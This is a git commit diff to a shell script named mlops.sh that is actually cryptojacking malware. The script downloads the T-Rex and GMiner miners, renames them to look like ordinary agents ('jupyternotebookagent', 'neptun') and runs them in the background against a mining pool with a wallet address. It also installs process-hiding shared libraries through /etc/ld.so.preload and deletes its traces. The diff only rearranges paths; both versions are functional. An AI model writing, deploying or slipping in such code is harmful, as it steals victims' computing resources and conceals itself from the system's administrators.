7ec071b7419cb68db5e5a5bfb85c2e701b6cc1f0
Gönenç <40662677+xeroxpro@users.noreply.github.com>
2023-12-18 14:03:42 +0300

    sixh commit

--- mlops.sh
+++ mlops.sh
@@ -1,18 +1,20 @@
 mkdir /tmp/ml && mv Makefile processhider.c /tmp/ml/ 
-cd /tmp/ml
 wget https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz
-tar xf t-rex-0.26.8-linux.tar.gz
-cp t-rex ../jupyternotebookagent
+mv t-rex-0.26.8-linux.tar.gz /tmp/ml/
+tar xf /tmp/ml/t-rex-0.26.8-linux.tar.gz
+cp /tmp/ml/t-rex /tmp/jupyternotebookagent
 ./tmp/jupyternotebookagent -a kawpow -o stratum+tcp://xna.2miners.com:6060 --user NibTPifN31vLNqZK1zUTX7LpeM2zAxw6Ek.RIG_3 -p x &
-make
-mv libprocesshider.so /usr/local/lib/
+./tmp/ml/make
+mv /tmp/ml/libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 wget https://github.com/develsoftware/GMinerRelease/releases/download/3.43/gminer_3_43_linux64.tar.xz
-tar xvf gminer_3_43_linux64.tar.xz 
-cp miner ../neptun
+mv gminer_3_43_linux64.tar.xz /tmp/ml/gminer_3_43_linux64.tar.xz
+tar xvf /tmp/ml/gminer_3_43_linux64.tar.xz 
+cp /tmp/ml/miner /tmp/neptun
 ./tmp/neptun --algo kawpow --server xna.2miners.com:6060 --user NibTPifN31vLNqZK1zUTX7LpeM2zAxw6Ek.RIG_4 -p x & 
-cd amd && make
-mv surec.so /usr/local/lib/
+mv /amd /tmp/ml/
+./tmp/ml/amd/make
+mv /tmp/ml/surec.so /usr/local/lib/
 echo /usr/local/lib/surec.so >> /etc/ld.so.preload
-cd ../../ && rm -rf ml/
+rm -rf /tmp/ml
 
